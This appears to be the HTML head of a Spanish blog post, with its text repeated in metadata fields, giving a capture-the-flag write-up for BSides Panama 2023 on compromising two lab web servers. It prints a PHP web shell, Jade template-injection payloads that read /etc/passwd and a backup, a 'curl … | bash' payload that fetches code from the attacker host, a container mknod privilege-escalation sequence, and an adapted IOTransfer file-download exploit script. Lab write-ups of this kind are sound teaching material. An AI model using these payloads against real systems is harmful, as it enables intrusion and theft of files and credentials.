<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <meta name="description" content="Quiero dar un agradecimiento especial para Tiz &lt;3 sin él este writeup no hubiera sido posible, dejo por aquí sus redes sociales. Twitter LinkedinRetos: ..."> <link type="application/atom+xml" rel="alternate" href="https://fmf-x0.github.io/feed.xml" title="FmF" /> <!-- Begin Jekyll SEO tag v2.8.0 --> <title>Bsides Panama 2023 | FmF</title> <meta name="generator" content="Jekyll v4.3.2" /> <meta property="og:title" content="Bsides Panama 2023" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="Quiero dar un agradecimiento especial para Tiz &lt;3 sin él este writeup no hubiera sido posible, dejo por aquí sus redes sociales. Twitter Linkedin Retos: Archivo de respaldo (WebServer) Acceso usuario (WebServer) Acceso administrativo (WebServer) Wordpress (WebServer) Password.txt (WebServer2) Acceso usuario (WebServer2) Acceso administrativo (WebServer2) Plataforma WEB (WebServer2) Topología de red: Archivo de respaldo (WebServer): Iniciamos el CTF, nos dan únicamente la VPN, así que nos toca enumerar la red en busca de targets, pero si nos fijamos en nuestra dirección IP la máscara de red es /30 por lo cual no tenemos vecinos para interactuar, pero si echamos un vistazo a los logs cuando nos conectamos con la VPN podemos ver una red diferente la cual es: 10.1.1.0 /24. Teniendo esta red podemos empezar a buscar hosts con el siguiente comando: sudo nmap -sP 10.1.1.1-255 -sp –&gt; Habilita la función de pingsweep. Podemos notar que encontró un host. Manos a la obra, vamos a realizar un escaneo más profundo con el siguiente comando: sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.1.1.100 -oN target Nos encontró los siguientes puertos: Empezamos enumerando los puertos del servicio Web. Utilizando el comando whatweb podemos ver que estamos ante un CentOS y más información sobre la página Web. Investigando notamos que hay dos servicios Web en los puertos 80 y 65400. Servicio Web en el puerto 80: Al utilizar fuzzing contra esta página podemos encontrar un archivo notes.txt el cual contiene información que nos puede ser útil más adelante: Y además encontramos una ruta /wordpress la cual contiene una página en WordPress. Servicio Web en el puerto 65400: Nos encontramos con una página normal. Viendo la página Web encontramos un par de credenciales en un post. Probamos las credenciales contra el panel de administración y estamos dentro como admin. En la interfaz administrativa podemos subir una imagen para personalizar el perfil de los usuarios, pero al no estar bien sanitizado pudimos subir un archivo php malicioso y ejecutar comandos en la máquina. El archivo que subimos fue el siguiente: &lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt; Al abrir la imagen(que en realidad es el archivo php malicioso) y colocar ?cmd=whoami podemos ejecutar comandos y también ganar acceso al sistema. Creamos un index.html en nuestra máquina de atacante para hacer la reverse shell. Después compartimos el index.html con python3 y nos ponemos en escucha con netcat: Ahora para obtener la reverse shell nos falta hacer lo siguiente: Estamos dentro como www-data, hacemos tratamiento de la TTY y listo. Enumeramos el sistema y con ss -nat nos damos cuenta de que hay un puerto que no podíamos ver desde el exterior, el cual es 8080, si nos recordamos antes nos dieron una pista de este puerto, la cual se encontraba en notes.txt. Realizamos un túnel con chisel para tener acceso a ese puerto desde nuestra máquina. En nuestra máquina lo ponemos así: (Servidor) En la sesión de www-data lo ponemos de la siguiente manera: (Cliente) Ahora nos dirigimos a nuestro navegador y podemos colocar 127.0.0.1:8080 y nos aparecerá el servicio que vimos en notes.txt. Si le ponemos el argumento /?q= y otra cosa podemos observar que nuestro output se ve reflejado y podemos pensar en un ataque SSTI con lo cual probamos un 7*7 el cual vemos que es vulnerable a un SSTI tipo Jade (NodeJS): https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection Para probarlo más podemos utilizar el siguiente payload: {root.process.mainModule.require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;, [&#39;/etc/passwd&#39;]).stdout} Y en efecto nos devuelve el /etc/passwd, pero no de la máquina en la cual tenemos acceso con www-data es otra máquina, investigando un poco más nos damos cuenta de que estamos ejecutando comandos en un contenedor, buscando cosas interesantes podemos encontrarnos con el backup. {root.process.mainModule.require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;, [&#39;/root/backup.sql&#39;]).stdout} Obtenemos la flag y un usuario y contraseña la cual son: admin:3b6a852b7bbd6f493275248fd64c103974fc1bf4f40b3eeb6502a85ca43282f1 Decodificamos el sha256 y obtenemos lo siguiente: admin:R@scal Acceso usuario (WebServer): Podemos utilizar estas credenciales para entrar al servidor por ssh. Además podemos ver la flag: Acceso administrativo (WebServer): (ruta alternativa) Para la siguiente ruta alternativa necesitamos ganar acceso al contenedor docker, con lo cual tenemos que ejecutar el siguiente comando en la vulnerabilidad del SSTI que comentamos anteriormente. {root.process.mainModule.require(&#39;child_process&#39;).exec(&#39;curl 172.16.80.42|bash&#39;)} Tenemos que tener todo exactamente igual que cuando ganamos acceso con al WebShell. Hacemos el tratamiento de la TTY y listo. Estamos como root y en la dirección IP 172.17.0.2 Enumeramos el contenedor y encontramos que podemos utilizar la siguiente información para leer archivos del sistema como usuario privilegiado: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_mknod https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames (La parte de escalada de privilegios) Podemos explotar la capabilitie mknod del contenedor: En el contenedor ejecutamos lo siguiente: cd / mknod sda b 8 0 chmod 777 sda echo &quot;admin:x:1000:1000:admin,,,:/home/admin:/bin/bash&quot; &gt;&gt; /etc/passwd su admin --&gt; Ejecutando este comando deberíamos pasar al usuario node /bin/bash En la máquina víctima como usuario admin ejecutamos lo siguiente: ps -auxf | grep /bin/bash --&gt; Para saber cuál es el PID. Ahora que tenemos el PID en este caso 2676 nos falta obtener la flag: grep -a &quot;root -&quot; /proc/2676/root/sda --&gt; Nos da un error al rato de ejecutarlo y para evitarlo utilizamos lo este otro comando: strings /proc/2676/root/sda | grep -a &quot;root -&quot; Obtenemos la flag: WordPress (WebServer): (ruta alternativa) Hay múltiples maneras de obtener esta flag, pero se me hizo muy fácil de esta manera: Tenemos acceso como root a mysql sin proporcionar contraseña: mysql -uroot -p --&gt; Cuando nos pide un password presionamos enter. show databases; use wordpress; select * from wp_posts where post_status=&#39;trash&#39;; --&gt; Podemos ver posts que han sido borrados. En WordPress, la papelera se gestiona en la base de datos de WordPress, específicamente en la tabla wp_posts, cuando se elimina una publicación, su estado se cambia a papelera en la columna post_status de la tabla wp_posts, y permanece allí hasta que se elimine permanentemente o se restaure. La tabla wp_posts también contiene columnas para el título, el contenido, el autor y otra información meta de la publicación. Podemos ver la flag: Password.txt (WebServer2) Para poder enumerar este host tenemos que hacer un reconocimiento de la red, ya que al parecer el sistema Windows estaba oculto en la red y no podíamos descubrirlo atrevés de ping, pero si pudimos encontrarlo gracias a los puertos. Ahora que sabemos que dirección IP tiene podemos hacer un escaneo más profundo con nmap y podemos encontrar los siguientes puertos: Empezamos enumerando el puerto 8080, y aplicamos fuzzing con el siguiente comando: wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.1.1.150:8080/FUZZ Después de esperar un buen rato podemos ver este directorio datos. Esto es lo que contiene el directorio: Buscamos en internet “iotransfer windows exploit” nos topamos con este artículo: https://www.exploit-db.com/exploits/50974 Para analizarlo mejor nos dirigimos al GitHub que aparece para ver el código, en mi caso no sirvió por un problema de incompatibilidad con la librería win32com, así que revisando el código podemos extraer unas partes y modificarlas para poder descargar el archivo que queramos, aquí esta el código: (Funcional en Linux) #!/bin/python3 import requests, json remoteDownloadPath = r&#39;C:\Users\frank\Desktop\password.txt&#39; IP = &quot;&quot; localDownloadPath =&quot;./password.txt&quot; def CreateDownloadTask(IP, Path) -&gt; str: url = f&#39;http://{IP}:7193/index.php?action=createtask&#39; task = { &#39;method&#39;: &#39;get&#39;, &#39;version&#39;: &#39;1&#39;, &#39;userid&#39;: &#39;*&#39;, &#39;taskstate&#39;: &#39;0&#39;, &#39;filepath&#39;: Path } res = requests.post(url, json=task) task = json.loads(res.content) task = json.loads(task[&#39;content&#39;]) taskid = task[&#39;taskid&#39;] print(f&quot;TaskID: {taskid}&quot;) return taskid def ExploitDownload(IP, DownloadPath, ID=None): if ID: url = f&#39;http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={ID}&#39; else: taskid = CreateDownloadTask(IP, DownloadPath) url = f&#39;http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={taskid}&#39; res = requests.get(url) return if __name__ == &#39;__main__&#39;: print(f&quot;[*] Downloading the file: {remoteDownloadPath}&quot;) res = ExploitDownload(IP, remoteDownloadPath) file = open(localDownloadPath, &quot;wb+&quot;) file.write(res.content) file.close() Lo ejecutamos y obtenemos lo siguiente: Acceso usuario (WebServer2): Para poder interactuar con el RDP necesitamos hacer un port forwarding entre el webserver(10.1.1.100) y webserver2(10.1.1.150). ssh admin@10.1.1.100 -L 3389:10.1.1.150:3389 Para conectarnos podemos utilizar: xfreerdp o remmina. En este caso utilizamos remmina y le tenemos que habilitar que ignore el certificado autofirmado y poner el time out 60000 después de configurar esto podemos proporcionar las credenciales y estamos dentro del sistema como el usuario frank y podemos encontrar la flag en el escritorio. Acceso administrativo (WebServer2): Dentro del sistema enumerando un poco podemos notar que el usuario frank tiene permiso de escritura sobre el directorio xampp2(Está corriendo los servicios Web en los puertos 8080 y 8081), nos dirigimos al directorio C:\xampp2\htdocs\ y subimos una reverse shell para después ejecutarla desde la página web y si vemos quien la esta ejecutando es WEBSERVER\Administrator así que ya podemos buscar la flag del administrador. Plataforma WEB (WebServer2) (ruta alternativa): Nos conectamos en localhost al PhpMyAdmin y extraemos la flag que estaba en la base de datos. Esto es todo el CTF de Bsides Panama 2023, tengo que decir que fue muy divertido y en donde aprendí muchas cosas." /> <meta property="og:description" content="Quiero dar un agradecimiento especial para Tiz &lt;3 sin él este writeup no hubiera sido posible, dejo por aquí sus redes sociales. Twitter Linkedin Retos: Archivo de respaldo (WebServer) Acceso usuario (WebServer) Acceso administrativo (WebServer) Wordpress (WebServer) Password.txt (WebServer2) Acceso usuario (WebServer2) Acceso administrativo (WebServer2) Plataforma WEB (WebServer2) Topología de red: Archivo de respaldo (WebServer): Iniciamos el CTF, nos dan únicamente la VPN, así que nos toca enumerar la red en busca de targets, pero si nos fijamos en nuestra dirección IP la máscara de red es /30 por lo cual no tenemos vecinos para interactuar, pero si echamos un vistazo a los logs cuando nos conectamos con la VPN podemos ver una red diferente la cual es: 10.1.1.0 /24. Teniendo esta red podemos empezar a buscar hosts con el siguiente comando: sudo nmap -sP 10.1.1.1-255 -sp –&gt; Habilita la función de pingsweep. Podemos notar que encontró un host. Manos a la obra, vamos a realizar un escaneo más profundo con el siguiente comando: sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.1.1.100 -oN target Nos encontró los siguientes puertos: Empezamos enumerando los puertos del servicio Web. Utilizando el comando whatweb podemos ver que estamos ante un CentOS y más información sobre la página Web. Investigando notamos que hay dos servicios Web en los puertos 80 y 65400. Servicio Web en el puerto 80: Al utilizar fuzzing contra esta página podemos encontrar un archivo notes.txt el cual contiene información que nos puede ser útil más adelante: Y además encontramos una ruta /wordpress la cual contiene una página en WordPress. Servicio Web en el puerto 65400: Nos encontramos con una página normal. Viendo la página Web encontramos un par de credenciales en un post. Probamos las credenciales contra el panel de administración y estamos dentro como admin. En la interfaz administrativa podemos subir una imagen para personalizar el perfil de los usuarios, pero al no estar bien sanitizado pudimos subir un archivo php malicioso y ejecutar comandos en la máquina. El archivo que subimos fue el siguiente: &lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt; Al abrir la imagen(que en realidad es el archivo php malicioso) y colocar ?cmd=whoami podemos ejecutar comandos y también ganar acceso al sistema. Creamos un index.html en nuestra máquina de atacante para hacer la reverse shell. Después compartimos el index.html con python3 y nos ponemos en escucha con netcat: Ahora para obtener la reverse shell nos falta hacer lo siguiente: Estamos dentro como www-data, hacemos tratamiento de la TTY y listo. Enumeramos el sistema y con ss -nat nos damos cuenta de que hay un puerto que no podíamos ver desde el exterior, el cual es 8080, si nos recordamos antes nos dieron una pista de este puerto, la cual se encontraba en notes.txt. Realizamos un túnel con chisel para tener acceso a ese puerto desde nuestra máquina. En nuestra máquina lo ponemos así: (Servidor) En la sesión de www-data lo ponemos de la siguiente manera: (Cliente) Ahora nos dirigimos a nuestro navegador y podemos colocar 127.0.0.1:8080 y nos aparecerá el servicio que vimos en notes.txt. Si le ponemos el argumento /?q= y otra cosa podemos observar que nuestro output se ve reflejado y podemos pensar en un ataque SSTI con lo cual probamos un 7*7 el cual vemos que es vulnerable a un SSTI tipo Jade (NodeJS): https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection Para probarlo más podemos utilizar el siguiente payload: {root.process.mainModule.require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;, [&#39;/etc/passwd&#39;]).stdout} Y en efecto nos devuelve el /etc/passwd, pero no de la máquina en la cual tenemos acceso con www-data es otra máquina, investigando un poco más nos damos cuenta de que estamos ejecutando comandos en un contenedor, buscando cosas interesantes podemos encontrarnos con el backup. {root.process.mainModule.require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;, [&#39;/root/backup.sql&#39;]).stdout} Obtenemos la flag y un usuario y contraseña la cual son: admin:3b6a852b7bbd6f493275248fd64c103974fc1bf4f40b3eeb6502a85ca43282f1 Decodificamos el sha256 y obtenemos lo siguiente: admin:R@scal Acceso usuario (WebServer): Podemos utilizar estas credenciales para entrar al servidor por ssh. Además podemos ver la flag: Acceso administrativo (WebServer): (ruta alternativa) Para la siguiente ruta alternativa necesitamos ganar acceso al contenedor docker, con lo cual tenemos que ejecutar el siguiente comando en la vulnerabilidad del SSTI que comentamos anteriormente. {root.process.mainModule.require(&#39;child_process&#39;).exec(&#39;curl 172.16.80.42|bash&#39;)} Tenemos que tener todo exactamente igual que cuando ganamos acceso con al WebShell. Hacemos el tratamiento de la TTY y listo. Estamos como root y en la dirección IP 172.17.0.2 Enumeramos el contenedor y encontramos que podemos utilizar la siguiente información para leer archivos del sistema como usuario privilegiado: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_mknod https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames (La parte de escalada de privilegios) Podemos explotar la capabilitie mknod del contenedor: En el contenedor ejecutamos lo siguiente: cd / mknod sda b 8 0 chmod 777 sda echo &quot;admin:x:1000:1000:admin,,,:/home/admin:/bin/bash&quot; &gt;&gt; /etc/passwd su admin --&gt; Ejecutando este comando deberíamos pasar al usuario node /bin/bash En la máquina víctima como usuario admin ejecutamos lo siguiente: ps -auxf | grep /bin/bash --&gt; Para saber cuál es el PID. Ahora que tenemos el PID en este caso 2676 nos falta obtener la flag: grep -a &quot;root -&quot; /proc/2676/root/sda --&gt; Nos da un error al rato de ejecutarlo y para evitarlo utilizamos lo este otro comando: strings /proc/2676/root/sda | grep -a &quot;root -&quot; Obtenemos la flag: WordPress (WebServer): (ruta alternativa) Hay múltiples maneras de obtener esta flag, pero se me hizo muy fácil de esta manera: Tenemos acceso como root a mysql sin proporcionar contraseña: mysql -uroot -p --&gt; Cuando nos pide un password presionamos enter. show databases; use wordpress; select * from wp_posts where post_status=&#39;trash&#39;; --&gt; Podemos ver posts que han sido borrados. En WordPress, la papelera se gestiona en la base de datos de WordPress, específicamente en la tabla wp_posts, cuando se elimina una publicación, su estado se cambia a papelera en la columna post_status de la tabla wp_posts, y permanece allí hasta que se elimine permanentemente o se restaure. La tabla wp_posts también contiene columnas para el título, el contenido, el autor y otra información meta de la publicación. Podemos ver la flag: Password.txt (WebServer2) Para poder enumerar este host tenemos que hacer un reconocimiento de la red, ya que al parecer el sistema Windows estaba oculto en la red y no podíamos descubrirlo atrevés de ping, pero si pudimos encontrarlo gracias a los puertos. Ahora que sabemos que dirección IP tiene podemos hacer un escaneo más profundo con nmap y podemos encontrar los siguientes puertos: Empezamos enumerando el puerto 8080, y aplicamos fuzzing con el siguiente comando: wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.1.1.150:8080/FUZZ Después de esperar un buen rato podemos ver este directorio datos. Esto es lo que contiene el directorio: Buscamos en internet “iotransfer windows exploit” nos topamos con este artículo: https://www.exploit-db.com/exploits/50974 Para analizarlo mejor nos dirigimos al GitHub que aparece para ver el código, en mi caso no sirvió por un problema de incompatibilidad con la librería win32com, así que revisando el código podemos extraer unas partes y modificarlas para poder descargar el archivo que queramos, aquí esta el código: (Funcional en Linux) #!/bin/python3 import requests, json remoteDownloadPath = r&#39;C:\Users\frank\Desktop\password.txt&#39; IP = &quot;&quot; localDownloadPath =&quot;./password.txt&quot; def CreateDownloadTask(IP, Path) -&gt; str: url = f&#39;http://{IP}:7193/index.php?action=createtask&#39; task = { &#39;method&#39;: &#39;get&#39;, &#39;version&#39;: &#39;1&#39;, &#39;userid&#39;: &#39;*&#39;, &#39;taskstate&#39;: &#39;0&#39;, &#39;filepath&#39;: Path } res = requests.post(url, json=task) task = json.loads(res.content) task = json.loads(task[&#39;content&#39;]) taskid = task[&#39;taskid&#39;] print(f&quot;TaskID: {taskid}&quot;) return taskid def ExploitDownload(IP, DownloadPath, ID=None): if ID: url = f&#39;http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={ID}&#39; else: taskid = CreateDownloadTask(IP, DownloadPath) url = f&#39;http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={taskid}&#39; res = requests.get(url) return if __name__ == &#39;__main__&#39;: print(f&quot;[*] Downloading the file: {remoteDownloadPath}&quot;) res = ExploitDownload(IP, remoteDownloadPath) file = open(localDownloadPath, &quot;wb+&quot;) file.write(res.content) file.close() Lo ejecutamos y obtenemos lo siguiente: Acceso usuario (WebServer2): Para poder interactuar con el RDP necesitamos hacer un port forwarding entre el webserver(10.1.1.100) y webserver2(10.1.1.150). ssh admin@10.1.1.100 -L 3389:10.1.1.150:3389 Para conectarnos podemos utilizar: xfreerdp o remmina. En este caso utilizamos remmina y le tenemos que habilitar que ignore el certificado autofirmado y poner el time out 60000 después de configurar esto podemos proporcionar las credenciales y estamos dentro del sistema como el usuario frank y podemos encontrar la flag en el escritorio. Acceso administrativo (WebServer2): Dentro del sistema enumerando un poco podemos notar que el usuario frank tiene permiso de escritura sobre el directorio xampp2(Está corriendo los servicios Web en los puertos 8080 y 8081), nos dirigimos al directorio C:\xampp2\htdocs\ y subimos una reverse shell para después ejecutarla desde la página web y si vemos quien la esta ejecutando es WEBSERVER\Administrator así que ya podemos buscar la flag del administrador. Plataforma WEB (WebServer2) (ruta alternativa): Nos conectamos en localhost al PhpMyAdmin y extraemos la flag que estaba en la base de datos. Esto es todo el CTF de Bsides Panama 2023, tengo que decir que fue muy divertido y en donde aprendí muchas cosas." /> <link rel="canonical" href="https://fmf-x0.github.io/bsides/bsides-panama-2023" /> <meta property="og:url" content="https://fmf-x0.github.io/bsides/bsides-panama-2023" /> <meta property="og:site_name" content="FmF" /> <meta property="og:type" content="article" /> <meta property="article:published_time" content="2023-02-01T00:00:00-06:00" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="Bsides Panama 2023" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-02-01T00:00:00-06:00","datePublished":"2023-02-01T00:00:00-06:00","description":"Quiero dar un agradecimiento especial para Tiz &lt;3 sin él este writeup no hubiera sido posible, dejo por aquí sus redes sociales. Twitter Linkedin Retos: Archivo de respaldo (WebServer) Acceso usuario (WebServer) Acceso administrativo (WebServer) Wordpress (WebServer) Password.txt (WebServer2) Acceso usuario (WebServer2) Acceso administrativo (WebServer2) Plataforma WEB (WebServer2) Topología de red: Archivo de respaldo (WebServer): Iniciamos el CTF, nos dan únicamente la VPN, así que nos toca enumerar la red en busca de targets, pero si nos fijamos en nuestra dirección IP la máscara de red es /30 por lo cual no tenemos vecinos para interactuar, pero si echamos un vistazo a los logs cuando nos conectamos con la VPN podemos ver una red diferente la cual es: 10.1.1.0 /24. Teniendo esta red podemos empezar a buscar hosts con el siguiente comando: sudo nmap -sP 10.1.1.1-255 -sp –&gt; Habilita la función de pingsweep. Podemos notar que encontró un host. Manos a la obra, vamos a realizar un escaneo más profundo con el siguiente comando: sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.1.1.100 -oN target Nos encontró los siguientes puertos: Empezamos enumerando los puertos del servicio Web. Utilizando el comando whatweb podemos ver que estamos ante un CentOS y más información sobre la página Web. Investigando notamos que hay dos servicios Web en los puertos 80 y 65400. Servicio Web en el puerto 80: Al utilizar fuzzing contra esta página podemos encontrar un archivo notes.txt el cual contiene información que nos puede ser útil más adelante: Y además encontramos una ruta /wordpress la cual contiene una página en WordPress. Servicio Web en el puerto 65400: Nos encontramos con una página normal. Viendo la página Web encontramos un par de credenciales en un post. Probamos las credenciales contra el panel de administración y estamos dentro como admin. En la interfaz administrativa podemos subir una imagen para personalizar el perfil de los usuarios, pero al no estar bien sanitizado pudimos subir un archivo php malicioso y ejecutar comandos en la máquina. El archivo que subimos fue el siguiente: &lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt; Al abrir la imagen(que en realidad es el archivo php malicioso) y colocar ?cmd=whoami podemos ejecutar comandos y también ganar acceso al sistema. Creamos un index.html en nuestra máquina de atacante para hacer la reverse shell. Después compartimos el index.html con python3 y nos ponemos en escucha con netcat: Ahora para obtener la reverse shell nos falta hacer lo siguiente: Estamos dentro como www-data, hacemos tratamiento de la TTY y listo. Enumeramos el sistema y con ss -nat nos damos cuenta de que hay un puerto que no podíamos ver desde el exterior, el cual es 8080, si nos recordamos antes nos dieron una pista de este puerto, la cual se encontraba en notes.txt. Realizamos un túnel con chisel para tener acceso a ese puerto desde nuestra máquina. En nuestra máquina lo ponemos así: (Servidor) En la sesión de www-data lo ponemos de la siguiente manera: (Cliente) Ahora nos dirigimos a nuestro navegador y podemos colocar 127.0.0.1:8080 y nos aparecerá el servicio que vimos en notes.txt. Si le ponemos el argumento /?q= y otra cosa podemos observar que nuestro output se ve reflejado y podemos pensar en un ataque SSTI con lo cual probamos un 7*7 el cual vemos que es vulnerable a un SSTI tipo Jade (NodeJS): https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection Para probarlo más podemos utilizar el siguiente payload: {root.process.mainModule.require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;, [&#39;/etc/passwd&#39;]).stdout} Y en efecto nos devuelve el /etc/passwd, pero no de la máquina en la cual tenemos acceso con www-data es otra máquina, investigando un poco más nos damos cuenta de que estamos ejecutando comandos en un contenedor, buscando cosas interesantes podemos encontrarnos con el backup. {root.process.mainModule.require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;, [&#39;/root/backup.sql&#39;]).stdout} Obtenemos la flag y un usuario y contraseña la cual son: admin:3b6a852b7bbd6f493275248fd64c103974fc1bf4f40b3eeb6502a85ca43282f1 Decodificamos el sha256 y obtenemos lo siguiente: admin:R@scal Acceso usuario (WebServer): Podemos utilizar estas credenciales para entrar al servidor por ssh. Además podemos ver la flag: Acceso administrativo (WebServer): (ruta alternativa) Para la siguiente ruta alternativa necesitamos ganar acceso al contenedor docker, con lo cual tenemos que ejecutar el siguiente comando en la vulnerabilidad del SSTI que comentamos anteriormente. {root.process.mainModule.require(&#39;child_process&#39;).exec(&#39;curl 172.16.80.42|bash&#39;)} Tenemos que tener todo exactamente igual que cuando ganamos acceso con al WebShell. Hacemos el tratamiento de la TTY y listo. Estamos como root y en la dirección IP 172.17.0.2 Enumeramos el contenedor y encontramos que podemos utilizar la siguiente información para leer archivos del sistema como usuario privilegiado: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_mknod https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames (La parte de escalada de privilegios) Podemos explotar la capabilitie mknod del contenedor: En el contenedor ejecutamos lo siguiente: cd / mknod sda b 8 0 chmod 777 sda echo &quot;admin:x:1000:1000:admin,,,:/home/admin:/bin/bash&quot; &gt;&gt; /etc/passwd su admin --&gt; Ejecutando este comando deberíamos pasar al usuario node /bin/bash En la máquina víctima como usuario admin ejecutamos lo siguiente: ps -auxf | grep /bin/bash --&gt; Para saber cuál es el PID. Ahora que tenemos el PID en este caso 2676 nos falta obtener la flag: grep -a &quot;root -&quot; /proc/2676/root/sda --&gt; Nos da un error al rato de ejecutarlo y para evitarlo utilizamos lo este otro comando: strings /proc/2676/root/sda | grep -a &quot;root -&quot; Obtenemos la flag: WordPress (WebServer): (ruta alternativa) Hay múltiples maneras de obtener esta flag, pero se me hizo muy fácil de esta manera: Tenemos acceso como root a mysql sin proporcionar contraseña: mysql -uroot -p --&gt; Cuando nos pide un password presionamos enter. show databases; use wordpress; select * from wp_posts where post_status=&#39;trash&#39;; --&gt; Podemos ver posts que han sido borrados. En WordPress, la papelera se gestiona en la base de datos de WordPress, específicamente en la tabla wp_posts, cuando se elimina una publicación, su estado se cambia a papelera en la columna post_status de la tabla wp_posts, y permanece allí hasta que se elimine permanentemente o se restaure. La tabla wp_posts también contiene columnas para el título, el contenido, el autor y otra información meta de la publicación. Podemos ver la flag: Password.txt (WebServer2) Para poder enumerar este host tenemos que hacer un reconocimiento de la red, ya que al parecer el sistema Windows estaba oculto en la red y no podíamos descubrirlo atrevés de ping, pero si pudimos encontrarlo gracias a los puertos. Ahora que sabemos que dirección IP tiene podemos hacer un escaneo más profundo con nmap y podemos encontrar los siguientes puertos: Empezamos enumerando el puerto 8080, y aplicamos fuzzing con el siguiente comando: wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.1.1.150:8080/FUZZ Después de esperar un buen rato podemos ver este directorio datos. Esto es lo que contiene el directorio: Buscamos en internet “iotransfer windows exploit” nos topamos con este artículo: https://www.exploit-db.com/exploits/50974 Para analizarlo mejor nos dirigimos al GitHub que aparece para ver el código, en mi caso no sirvió por un problema de incompatibilidad con la librería win32com, así que revisando el código podemos extraer unas partes y modificarlas para poder descargar el archivo que queramos, aquí esta el código: (Funcional en Linux) #!/bin/python3 import requests, json remoteDownloadPath = r&#39;C:\\Users\\frank\\Desktop\\password.txt&#39; IP = &quot;&quot; localDownloadPath =&quot;./password.txt&quot; def CreateDownloadTask(IP, Path) -&gt; str: url = f&#39;http://{IP}:7193/index.php?action=createtask&#39; task = { &#39;method&#39;: &#39;get&#39;, &#39;version&#39;: &#39;1&#39;, &#39;userid&#39;: &#39;*&#39;, &#39;taskstate&#39;: &#39;0&#39;, &#39;filepath&#39;: Path } res = requests.post(url, json=task) task = json.loads(res.content) task = json.loads(task[&#39;content&#39;]) taskid = task[&#39;taskid&#39;] print(f&quot;TaskID: {taskid}&quot;) return taskid def ExploitDownload(IP, DownloadPath, ID=None): if ID: url = f&#39;http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={ID}&#39; else: taskid = CreateDownloadTask(IP, DownloadPath) url = f&#39;http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={taskid}&#39; res = requests.get(url) return if __name__ == &#39;__main__&#39;: print(f&quot;[*] Downloading the file: {remoteDownloadPath}&quot;) res = ExploitDownload(IP, remoteDownloadPath) file = open(localDownloadPath, &quot;wb+&quot;) file.write(res.content) file.close() Lo ejecutamos y obtenemos lo siguiente: Acceso usuario (WebServer2): Para poder interactuar con el RDP necesitamos hacer un port forwarding entre el webserver(10.1.1.100) y webserver2(10.1.1.150). ssh admin@10.1.1.100 -L 3389:10.1.1.150:3389 Para conectarnos podemos utilizar: xfreerdp o remmina. En este caso utilizamos remmina y le tenemos que habilitar que ignore el certificado autofirmado y poner el time out 60000 después de configurar esto podemos proporcionar las credenciales y estamos dentro del sistema como el usuario frank y podemos encontrar la flag en el escritorio. Acceso administrativo (WebServer2): Dentro del sistema enumerando un poco podemos notar que el usuario frank tiene permiso de escritura sobre el directorio xampp2(Está corriendo los servicios Web en los puertos 8080 y 8081), nos dirigimos al directorio C:\\xampp2\\htdocs\\ y subimos una reverse shell para después ejecutarla desde la página web y si vemos quien la esta ejecutando es WEBSERVER\\Administrator así que ya podemos buscar la flag del administrador. Plataforma WEB (WebServer2) (ruta alternativa): Nos conectamos en localhost al PhpMyAdmin y extraemos la flag que estaba en la base de datos. Esto es todo el CTF de Bsides Panama 2023, tengo que decir que fue muy divertido y en donde aprendí muchas cosas.","headline":"Bsides Panama 2023","mainEntityOfPage":{"@type":"WebPage","@id":"https://fmf-x0.github.io/bsides/bsides-panama-2023"},"url":"https://fmf-x0.github.io/bsides/bsides-panama-2023"}</script> <!-- End Jekyll SEO tag --> <link rel="shortcut icon" href="/favicon.ico" type="image/icon"> <link rel="icon" href="/favicon.ico" type="image/icon"> <!-- stylesheets --> <link rel="stylesheet" type="text/css" href="/assets/css/base.css"> <link rel="stylesheet" type="text/css" href="/assets/css/simplePagination.css"> <link rel="stylesheet" type="text/css" href="/assets/css/highlight-theme.css"> <link rel="stylesheet" type="text/css" href="/assets/css/rouge-code.css"> <link rel="stylesheet" type="text/css" href="/assets/css/post.css"> <!-- javascripts --> <script type="text/javascript" src="/assets/js/jquery.js"></script> <!--[if lt IE 9]> <script src="/assets/js/html5shiv.js"></script> <![endif]--> </head> <!-- bare layout means not header and footer like resume --> <body> <header id="l-header"> <div class="container"> <div class="row navicon"> <a href=""><i class="fa fa-navicon"></i></a> </div> <div class="row navbar"> <nav class="col-lg-8 col-md-8 col-xs-12"> <ul class="row"> <li class="col-lg-3"><a href="/">HOME</a></li> <li class="col-lg-3"> <ul class="subnav"> <a href="javascript:void(0)">POST</a> <li><a href="/category">CATEGORY</a></li> <li><a href="/tag">TAG</a></li> </ul> </li> <li class="col-lg-3"><a href="/about">ABOUT</a></li> </ul> 